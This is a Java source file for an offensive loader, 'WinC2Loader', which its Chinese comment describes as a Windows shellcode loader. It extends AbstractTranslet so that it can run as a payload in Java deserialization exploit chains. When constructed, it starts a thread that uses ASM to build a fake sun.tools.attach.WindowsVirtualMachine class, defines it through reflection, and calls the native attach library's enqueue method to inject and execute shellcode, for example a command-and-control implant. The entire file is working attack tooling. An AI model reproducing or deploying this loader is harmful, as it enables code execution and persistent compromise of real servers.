package loader;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import jdk.internal.org.objectweb.asm.*;

import java.io.*;
import java.lang.reflect.Method;
import java.security.ProtectionDomain;

/**
 * win shelcode 加载器， 参考 https://xz.aliyun.com/t/10075#toc-4, 自定义类调用系统Native库函数
 */
public class WinC2Loader extends AbstractTranslet implements Serializable, Runnable {

    private static byte[] shellcode;
    public static boolean firstRun = true;

    public WinC2Loader(){
        transletVersion = 101;
        if(firstRun){
            new Thread(this).start();
            firstRun = false;
        }
    }

    public void run(){
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("windows")) {
                String clazzName = "sun.tools.attach.WindowsVirtualMachine";
                Class<?> windowsVirtualMachineClass;
                try {
                    windowsVirtualMachineClass = Class.forName(clazzName);
                } catch (ClassNotFoundException e) {
                    byte[] classBytes = dump();
                    ClassLoader loader = getClass().getClassLoader();
                    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class, ProtectionDomain.class);
                    defineClass.setAccessible(true);
                    windowsVirtualMachineClass = (Class<?>) defineClass.invoke(loader, clazzName, classBytes, 0, classBytes.length, null);
                }
                Method runMethod = windowsVirtualMachineClass.getDeclaredMethod("run", byte[].class);
                runMethod.setAccessible(true);
                runMethod.invoke(windowsVirtualMachineClass, shellcode);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * ASM 加载class，原代码：
     *
     * package sun.tools.attach;
     * import java.io.*;
     *
     * public class WindowsVirtualMachine
     * {
     *     static native void enqueue(final long p0, final byte[] p1, final String p2, final String p3, final Object... p4) throws IOException;
     *     static native long openProcess(final int p0) throws IOException;
     *     public static void run(byte[] buf) {
     *         System.loadLibrary("attach");
     *         try {
     *             enqueue(-1L, buf, "test", "test", new Object[0]);
     *         }
     *         catch (Exception e) {
     *             e.printStackTrace();
     *         }
     *     }
     * }
     *
     * @return
     * @throws Exception
     */
    public byte[] dump () throws Exception {
        ClassWriter cw = new ClassWriter(0);
        FieldVisitor fv;
        MethodVisitor mv;
        AnnotationVisitor av0;

        cw.visit(52, 1 + 32, "sun/tools/attach/WindowsVirtualMachine", null, "java/lang/Object", null);

        mv = cw.visitMethod(1, "<init>", "()V", null, null);
        mv.visitCode();
        mv.visitVarInsn(25, 0);
        mv.visitMethodInsn(183, "java/lang/Object", "<init>", "()V", false);
        mv.visitInsn(177);
        mv.visitMaxs(1, 1);
        mv.visitEnd();

        mv = cw.visitMethod(8 + 128 + 256, "enqueue", "(J[BLjava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V", null, new String[] { "java/io/IOException" });
        mv.visitEnd();

        mv = cw.visitMethod(8 + 256, "openProcess", "(I)J", null, new String[] { "java/io/IOException" });
        mv.visitEnd();

        mv = cw.visitMethod(1 + 8, "run", "([B)V", null, null);
        mv.visitCode();
        Label l0 = new Label();
        Label l1 = new Label();
        Label l2 = new Label();
        mv.visitTryCatchBlock(l0, l1, l2, "java/lang/Exception");
        mv.visitLdcInsn("attach");
        mv.visitMethodInsn(184, "java/lang/System", "loadLibrary", "(Ljava/lang/String;)V", false);
        mv.visitLabel(l0);
        mv.visitLdcInsn(new Long(-1L));
        mv.visitVarInsn(25, 0);
        mv.visitLdcInsn("test");
        mv.visitLdcInsn("test");
        mv.visitInsn(3);
        mv.visitTypeInsn(189, "java/lang/Object");
        mv.visitMethodInsn(184, "sun/tools/attach/WindowsVirtualMachine", "enqueue", "(J[BLjava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V", false);
        mv.visitLabel(l1);
        Label l3 = new Label();
        mv.visitJumpInsn(167, l3);
        mv.visitLabel(l2);
        mv.visitFrame(4, 0, null, 1, new Object[] {"java/lang/Exception"});
        mv.visitVarInsn(58, 1);
        mv.visitVarInsn(25, 1);
        mv.visitMethodInsn(182, "java/lang/Exception", "printStackTrace", "()V", false);
        mv.visitLabel(l3);
        mv.visitFrame(3, 0, null, 0, null);
        mv.visitInsn(177);
        mv.visitMaxs(6, 2);
        mv.visitEnd();
        cw.visitEnd();
        return cw.toByteArray();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}